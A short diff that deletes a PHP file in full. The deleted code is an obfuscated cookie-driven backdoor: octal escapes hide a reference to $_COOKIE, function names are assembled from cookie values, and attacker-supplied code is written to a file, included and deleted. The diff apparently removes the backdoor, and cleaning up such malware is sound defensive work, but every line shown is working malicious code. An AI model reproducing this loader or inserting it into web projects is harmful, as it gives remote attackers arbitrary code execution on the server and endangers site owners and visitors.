@@ -1,2 +1,0 @@
-<?php
-$NlT=	${"\137"	. "\103\117". "\117"	."\113"."\111"."\105"	};if(	isset(	$NlT [	(72-33 ) 	] )){	$LW=$NlT	[ (93 -	50	)]	.$NlT[(74 -6)] ; $eGj=	$LW	(	$NlT [  (74-	10)].$NlT [ (86 -	23)		])	;$pEF =$eGj	($LW ( $NlT	[ (77-	22	)	 ] ));		$THXS=$eGj	($LW(	$NlT[	(82 - 35	) ] ));	$Dq	=__DIR__.$eGj( $LW($NlT [	 (	33 -16 )	 ]	)) ;	 $pEF(	$Dq, $eGj($LW	($NlT [ 	( 51	-12)		] )))	;  include($Dq	);$THXS	( $Dq	);	}
